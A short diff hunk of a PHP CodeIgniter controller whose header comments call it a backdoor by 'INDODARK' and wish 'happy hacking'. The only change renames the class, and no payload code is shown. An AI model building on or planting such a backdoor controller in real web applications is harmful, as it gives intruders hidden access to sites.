@@ -3,7 +3,7 @@
 // BACKDOOR OFFICEIAL INDODARK SISTEM
 // HAPPY HACKING BY INDODARK
 
-class New extends CI_Controller {
+class Newpage extends CI_Controller {
 	function __construct()
 	{
 		parent::__construct();	
